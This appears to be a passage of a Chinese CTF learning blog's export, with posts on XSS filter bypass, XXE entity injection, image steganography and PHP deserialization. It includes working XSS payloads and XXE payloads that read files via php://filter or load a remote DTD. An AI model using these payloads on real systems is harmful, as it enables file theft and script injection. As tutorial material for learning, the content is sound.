<p>匹配<code>&quot;</code>替换为<code>\&quot;</code>，这里直接用<code>\&quot;)</code>闭合前面的双引号会被转义，所以在加一个<code>\</code>来转义<code>\</code>即可。</p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">\&quot;);alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&quot;\\&quot;</span>);alert(<span class="number">1</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>&quot;);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>xss</category>
      </categories>
  </entry>
  <entry>
    <title>关于信息收集</title>
    <url>/2021/05/26/%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<p>[TOC]</p>
<h1 id="域名信息收集"><a href="#域名信息收集" class="headerlink" title="域名信息收集"></a>域名信息收集</h1><h2 id="域名介绍"><a href="#域名介绍" class="headerlink" title="域名介绍"></a>域名介绍</h2><h2 id="whois介绍"><a href="#whois介绍" class="headerlink" title="whois介绍"></a>whois介绍</h2><h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><h2 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h2><h1 id="web站点信息收集"><a href="#web站点信息收集" class="headerlink" title="web站点信息收集"></a>web站点信息收集</h1><h1 id="端口信息收集"><a href="#端口信息收集" class="headerlink" title="端口信息收集"></a>端口信息收集</h1><h1 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h1><h1 id="真实IP地址收集"><a href="#真实IP地址收集" class="headerlink" title="真实IP地址收集"></a>真实IP地址收集</h1>]]></content>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE</title>
    <url>/2021/07/18/xxe/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<h3 id="一、XXE-是什么"><a href="#一、XXE-是什么" class="headerlink" title="一、XXE 是什么"></a><strong>一、XXE 是什么</strong></h3><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p>
<h3 id="二、关于XML"><a href="#二、关于XML" class="headerlink" title="二、关于XML"></a><strong>二、关于XML</strong></h3><p><a href="https://www.runoob.com/xml/xml-intro.html">有关XML格式点这里</a></p>
<h4 id="关于DTD"><a href="#关于DTD" class="headerlink" title="关于DTD"></a>关于DTD</h4><p>DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。</p>
<p>一般认为有两种引用或声明方式：</p>
<ul>
<li>内部DTD：对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。</li>
<li>外部DTD：对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。</li>
</ul>
<p><strong>内部实体</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY b <span class="meta-string">&quot;123456&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="comment">&lt;!-- 123456 --&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>内部参数实体</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY % b <span class="meta-string">&quot;&lt;!ENTITY b1 &quot;</span>123456<span class="meta-string">&quot;&gt;&quot;</span>&gt;</span></span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="comment">&lt;!-- 123456 --&gt;</span></span><br></pre></td></tr></table></figure>

<p>参数实体用<code>% name</code>申明，引用时用<code>%name;</code>，只能在DTD中申明，DTD中引用；其余实体直接用<code>name</code>申明，引用时用<code>&amp;name;</code>，只能在DTD中申明，可在xml文档中引用。</p>
<p><strong>外部实体</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="comment">&lt;!-- ZmxhZ3tmMTRnXzFzX2hlcmV9 --&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>外部参数实体</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY % b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xxx.xxx.xxx.xxx/xml.dtd&quot;</span>&gt;</span></span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="comment">&lt;!-- ZmxhZ3tmMTRnXzFzX2hlcmV9 --&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;xml.dtd --&gt;</span><br><span class="line">&lt;!ENTITY b1 SYSTEM &quot;data:&#x2F;&#x2F;text&#x2F;plain;base64,ZmxhZ3tmMTRnXzFzX2hlcmV9&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="三、XXE应用"><a href="#三、XXE应用" class="headerlink" title="三、XXE应用"></a>三、XXE应用</h3>]]></content>
      <categories>
        <category>web漏洞</category>
      </categories>
  </entry>
  <entry>
    <title>有关图片隐写的学习</title>
    <url>/2021/07/22/%E5%85%B3%E4%BA%8E%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<h3 id="一、附加式图片隐写"><a href="#一、附加式图片隐写" class="headerlink" title="一、附加式图片隐写"></a>一、附加式图片隐写</h3><p>这种隐写方式通常是使用某种方式在载体文件中直接附加上要被隐写的信息。</p>
<p>在CTF中，这类图片隐写大概有两种经典方式：</p>
<p>​        1、直接附加字符串</p>
<p>​        2、图种形式的隐写</p>
<h4 id="附加字符串"><a href="#附加字符串" class="headerlink" title="附加字符串"></a>附加字符串</h4><p>这种类型可以用strings命令来查找</p>
<p>关于strings命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。</span><br><span class="line"></span><br><span class="line">用法：strings [选项] [文件]</span><br><span class="line"> 打印 [文件] (默认为标准输入) 中可打印的字符串</span><br><span class="line"> 选项为：</span><br><span class="line">-a --all：扫描整个文件而不是只扫描目标文件初始化和装载段</span><br><span class="line">-f –print-file-name：在显示字符串前先显示文件名</span><br><span class="line">-t --radix&#x3D;&#123;o,d,x&#125; ：输出字符的位置，基于八进制，十进制或者十六进制</span><br><span class="line">-e --encoding&#x3D;&#123;s,S,b,l,B,L&#125; ：选择字符大小和排列顺序:s &#x3D; 7-bit, S &#x3D; 8-bit, &#123;b,l&#125; &#x3D; 16-bit, &#123;B,L&#125; &#x3D; 32-bit</span><br><span class="line"></span><br><span class="line">-d --data                 Only scan the data sections in the file</span><br><span class="line">-n --bytes&#x3D;[number]       Locate &amp; print any NUL-terminated sequence of at</span><br><span class="line">-&lt;number&gt;                   least [number] characters (default 4).</span><br><span class="line">-w --include-all-whitespace Include all whitespace as valid string characters</span><br><span class="line">-o                        An alias for --radix&#x3D;o</span><br><span class="line">-T --target&#x3D;&lt;BFDNAME&gt;     Specify the binary file format</span><br><span class="line">-s --output-separator&#x3D;&lt;string&gt; String used to separate strings in output.</span><br><span class="line">@&lt;file&gt;                   Read options from &lt;file&gt;</span><br><span class="line">-h --help                 Display this information</span><br><span class="line">-v -V --version           Print the program&#39;s version number</span><br><span class="line">strings：支持的目标： elf64-x86-64 elf32-i386 elf32-iamcu elf32-x86-64 pei-i386 pei-x86-64 elf64-l1om elf64-k1om elf64-little elf64-big elf32-little elf32-big pe-x86-64 pe-bigobj-x86-64 pe-i386 srec symbolsrec verilog tekhex binary ihex plugin</span><br></pre></td></tr></table></figure>

<p>例如<code>strings 1.jpg |grep flag</code>查找1.jpg中可打印字符串中含有flag的字符串</p>
<p>这种类型一般是将信息插到图片的尾部，少数是插到中间。</p>
<h4 id="图种形式的隐写"><a href="#图种形式的隐写" class="headerlink" title="图种形式的隐写"></a>图种形式的隐写</h4><p>图种这是一种以图片文件为载体，通常为jpg格式的图片，然后将zip等压缩包文件附加在图片文件后面。因为操作系统识别的过程中是，从文件头标志，到文件的结束标志位，当系统识别到图片的结束标志位后，默认是不再继续识别的，所以我们在通常情况下只能看到它是只是一张图片。</p>
<p>利用Linux中的binwalk命令即可识别此图片文件都包含了什么文件    查询命令<code>binwalk 1.jpg</code>分离命令<code>binwalk -e 1.jpg</code></p>
<p>分离文件也可用foremost <code>foremost 1.jpg</code></p>
<p>binwalk可以自动识别出图片中藏的zip文件以及显示出偏移，binwalk命令还可以解压zilb数据</p>
<p>不想用命令的话可以用16进制编辑器打开图片文件，手动提取出压缩包，这就要求了要熟悉各种常见文件的文件头标识和结束标识（自行百度</p>
<h3 id="二、基于文件结构的图片隐写"><a href="#二、基于文件结构的图片隐写" class="headerlink" title="二、基于文件结构的图片隐写"></a>二、基于文件结构的图片隐写</h3><p>主要介绍关于png图片的隐写，<a href="https://ctf-wiki.org/misc/picture/png/">关于png文件结构戳这里</a></p>
<p>重点了解一下png图片文件头数据块以及png图片IDAT块，这次的隐写也是以这两个地方为基础的。</p>
<p><strong>png图片文件头数据块（IHDR）</strong></p>
<p>IHDR中，包括了图片的宽，高，图像深度，颜色类型，压缩方法等</p>
<p><strong>IDAT数据块</strong></p>
<p>它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。这是一个可以存在多个数据块类型的数据块。它的作用就是存储着图像真正的数据。因为它是可以存在多个的，所以即使我们写入一个多余的IDAT也不会多大影响肉眼对图片的观察</p>
<h4 id="高度被修改导致的隐写"><a href="#高度被修改导致的隐写" class="headerlink" title="高度被修改导致的隐写"></a>高度被修改导致的隐写</h4><p>图片的高度，宽度的值存放于PNG图片的文件头数据块，那么我们就可以通过修改PNG图片的高度值，来对部分信息进行隐藏的。</p>
<p>辨别：图片在Windows系统下能正常显示而Linux系统不能正常显示，这时候就要考虑图片高度是否被修改了</p>
<p>推荐一手010editor（一个16进制编辑器），可以运行图片模板，运行模板后可以轻易的找到图片的各个数据块位置及内容</p>
<p>知道高度被修改后可以直接改大高度也可以用脚本根据crc校验值爆破出来</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">img = <span class="built_in">open</span>(<span class="string">&#x27;图片的绝对路径&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xFFFF</span>):</span><br><span class="line">    stream = img[<span class="number">12</span>:<span class="number">20</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + img[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">    crc = binascii.crc32(stream)</span><br><span class="line">    <span class="keyword">if</span> crc == bytes_to_long(img[<span class="number">29</span>:<span class="number">33</span>]):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(i))<span class="comment">#输出高度的十六进制</span></span><br></pre></td></tr></table></figure>

<h4 id="隐写信息以IDAT块加入图片"><a href="#隐写信息以IDAT块加入图片" class="headerlink" title="隐写信息以IDAT块加入图片"></a>隐写信息以IDAT块加入图片</h4><p>图片的IDAT块是可以存在多个的，这导致了我们可以将隐写信息以IDAT块的形似加入图片。</p>
<p>可以使用pngcheck对图片进行检测  <a href="https://xz.aliyun.com/t/1836">具体实例看这里</a></p>
<p>这里不再赘述</p>
<p>我自己出了一个题可以检验一下  <a href="https://pan.baidu.com/s/1xtG_UmazI6TV_WL1u41Gwg">附件 密码T0MR</a></p>
<h3 id="三、LSB图片隐写"><a href="#三、LSB图片隐写" class="headerlink" title="三、LSB图片隐写"></a>三、LSB图片隐写</h3><p><a href="https://ctf-wiki.org/misc/picture/png/#lsb">lsb介绍戳这里</a></p>
<p>在ctf中，最常用于检测lsb隐写的工具为stegsolve    （<a href="http://t0mrvvi1b3t.top/2021/05/03/%E5%B7%A5%E5%85%B7/">这里有</a></p>
<p>提取rgb最低位脚本–<a href="https://xz.aliyun.com/t/1844">来自这里</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&quot;extracted.bmp&quot;</span>)</span><br><span class="line">pix = im.load()</span><br><span class="line">width, height = im.size</span><br><span class="line"></span><br><span class="line">extracted_bits = []</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):<span class="comment">#y，x代表的是图片的高以及宽度，进行一个循环提取</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        r, g, b = pix[(x,y)]</span><br><span class="line">        extracted_bits.append(r &amp; <span class="number">1</span>)</span><br><span class="line">        extracted_bits.append(g &amp; <span class="number">1</span>)</span><br><span class="line">        extracted_bits.append(b &amp; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">extracted_byte_bits = [extracted_bits[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(extracted_bits), <span class="number">8</span>)]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;extracted2.bmp&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> out:</span><br><span class="line">    <span class="keyword">for</span> byte_bits <span class="keyword">in</span> extracted_byte_bits:</span><br><span class="line">                byte_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> byte_bits)</span><br><span class="line">        byte = <span class="built_in">chr</span>(<span class="built_in">int</span>(byte_str, <span class="number">2</span>))</span><br><span class="line">        out.write(byte)</span><br></pre></td></tr></table></figure>



<h3 id="四、基于DCT域的JPG图片隐写"><a href="#四、基于DCT域的JPG图片隐写" class="headerlink" title="四、基于DCT域的JPG图片隐写"></a>四、基于DCT域的JPG图片隐写</h3><p><a href="https://ctf-wiki.org/misc/picture/jpg/">关于JPG戳这里</a></p>
<p>常见关于JPG的隐写方法有 JSteg、JPHide、Outguess、F5等 常用Stegdetect来检测是哪种隐写方式</p>
<p><a href="https://ctf-wiki.org/misc/picture/jpg/#stegdetect">关于Stegdetect和JPHS戳这里</a>  <a href="https://www.codenong.com/cs106178858/">压缩原理及工具使用戳这里</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;Stegdetect</span><br><span class="line">如果检测结果显示该文件可能包含隐藏信息，那么Stegdetect会在检测结果后面使用1～3颗星来标识</span><br><span class="line">隐藏信息存在的可能性大小，3颗星表示隐藏信息存在的可能性最大。</span><br></pre></td></tr></table></figure>

<h3 id="五、数字水印隐写"><a href="#五、数字水印隐写" class="headerlink" title="五、数字水印隐写"></a>五、数字水印隐写</h3><p><a href="https://www.jianshu.com/p/8a89b6ba5e39">LSB顺序替换嵌入与提取实现</a></p>
<p><a href="https://github.com/li-xin-yi/graduation-project/tree/master">加强版</a></p>
]]></content>
      <categories>
        <category>Misc</category>
        <category>图片隐写</category>
      </categories>
  </entry>
  <entry>
    <title>结合ctfshow学习php反序列化</title>
    <url>/2021/05/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<h2 id="PHP序列化是什么"><a href="#PHP序列化是什么" class="headerlink" title="PHP序列化是什么"></a>PHP序列化是什么</h2><h3 id="两个函数"><a href="#两个函数" class="headerlink" title="两个函数"></a>两个函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">serialize()     <span class="comment">//将一个对象转换成一个字符串</span></span><br><span class="line">unserialize()   <span class="comment">//将字符串还原成一个对象</span></span><br><span class="line"></span><br><span class="line">在php中，可以对数组，变量，对象等进行序列化（静态变量，常量不会被序列化）</span><br></pre></td></tr></table></figure>

<p>通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。</p>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//序列化</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$flag</span> = <span class="string">&quot;flag&#123;123456&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$flag2</span> = <span class="string">&quot;flag&#123;753159&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$aa</span> = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">        <span class="built_in">static</span> <span class="variable">$bb</span> = <span class="string">&quot;456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$test</span> = <span class="keyword">new</span> test;</span><br><span class="line">    <span class="variable">$data</span> = serialize(<span class="variable">$test</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://img.vim-cn.com/f2/00e6ed1085c1ad167d223991b9f9cc2729e9f2.png" alt="结果"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;指Object(对象) 4个字符:test</span><br><span class="line">:2 对象属性个数为2</span><br><span class="line">&#123;&#125;中为属性字符数：属性值</span><br><span class="line"></span><br><span class="line">对private变量序列化后会在变量名前面加入 %00类名%00</span><br><span class="line">对protected变量序列化后会在变量名前面加入%00*%00</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//反序列化</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$str</span>=<span class="string">&#x27;O:4:&quot;test&quot;:3:&#123;s:10:&quot;%00test%00flag&quot;;s:12:&quot;flag&#123;123456&#125;&quot;;s:8:&quot;%00*%00flag2&quot;;s:12:&quot;flag&#123;753159&#125;&quot;;s:2:&quot;aa&quot;;s:3:&quot;123&quot;;&#125;&#x27;</span>;</span><br><span class="line">	<span class="variable">$data</span> = urldecode(<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$obj</span> = unserialize(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">    var_dump(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">运行结果：</span><br><span class="line"><span class="keyword">object</span>(test)<span class="comment">#2 (3) &#123;</span></span><br><span class="line">  [<span class="string">&quot;flag&quot;</span>:<span class="string">&quot;test&quot;</span>:<span class="keyword">private</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">12</span>) <span class="string">&quot;flag&#123;123456&#125;&quot;</span></span><br><span class="line">  [<span class="string">&quot;flag2&quot;</span>:<span class="keyword">protected</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">12</span>) <span class="string">&quot;flag&#123;753159&#125;&quot;</span></span><br><span class="line">  [<span class="string">&quot;aa&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;123&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>在对PHP反序列化进行利用时，经常会遇到一些魔术方法。<a href="https://www.php.net/manual/zh/language.oop5.magic.php">PHP手册</a></p>
<h3 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法"></a>常见方法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) 构造函数 当一个对象被创建时触发</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__destruct</span>(<span class="params"></span>)  析构函数 当一个对象被销毁前触发</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__toString</span>(<span class="params"></span>)  当一个对象转化成字符串触发</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__sleep</span>(<span class="params"></span>)     反序列化时触发</span></span><br><span class="line"><span class="function">    //<span class="title">serialize</span>(<span class="params"></span>)会先检查是否有<span class="title">__sleep</span>(<span class="params"></span>)，将在序列化之前运行</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)    反序列化的时候触发</span></span><br><span class="line"><span class="function">    //<span class="title">unserialize</span>(<span class="params"></span>) 会检查是否有<span class="title">__wakeup</span>(<span class="params"></span>)，在反序列化之前运行</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__call</span>(<span class="params"></span>)      触发一个未定义的方法的时候</span></span><br><span class="line"><span class="function">    //必须传入两个变量，函数名和参数</span></span><br><span class="line"><span class="function">    // (<span class="params"><span class="keyword">string</span> <span class="variable">$functionName</span>, <span class="keyword">array</span> <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__callStatic</span>(<span class="params"></span>) 在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__get</span>(<span class="params"></span>)       读取一个对象无法访问/不存在的属性的时候</span></span><br><span class="line"><span class="function">    //在类中添加<span class="title">__get</span>(<span class="params"></span>)方法，在直接获取属性值时自动触发一次，以属性名作为参数传入并处理</span></span><br><span class="line"><span class="function">    //必须有一个传入值</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__set</span>(<span class="params"></span>) 用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__invoke</span>(<span class="params"></span>)    当脚本尝试将对象调用为函数时触发</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__isset</span>(<span class="params"></span>) 在不可访问的属性上调用<span class="title">isset</span>(<span class="params"></span>)或<span class="title">empty</span>(<span class="params"></span>)触发</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__unset</span>(<span class="params"></span>) 在不可访问的属性上使用<span class="title">unset</span>(<span class="params"></span>)时触发</span></span><br></pre></td></tr></table></figure>

<h3 id="比较重要的方法"><a href="#比较重要的方法" class="headerlink" title="比较重要的方法"></a>比较重要的方法</h3><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</span><br></pre></td></tr></table></figure>

<p>对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性</p>
<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><p>相关漏洞CVE-2016-7124；php版本 PHP&lt;5.6.25 &amp; PHP&lt;7.0.10</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">绕过方法：需要使传入的属性个数大于真实属性个数</span><br></pre></td></tr></table></figure>

<p>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作</p>
<h5 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$id</span>, <span class="variable">$sex</span>, <span class="variable">$age</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id = <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">&quot;id: %s, sex: %s, age: %d&quot;</span>, <span class="keyword">$this</span>-&gt;id, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">info</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;info . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**sleep()</span></span><br><span class="line"><span class="comment">     * serialize前调用 用于删选需要被序列化存储的成员变量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array [description]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>, <span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**wakeup()</span></span><br><span class="line"><span class="comment">     * unserialize前调用 用于预先准备对象资源</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">&quot;id: %s, sex: %s, age: %d&quot;</span>, <span class="keyword">$this</span>-&gt;id, <span 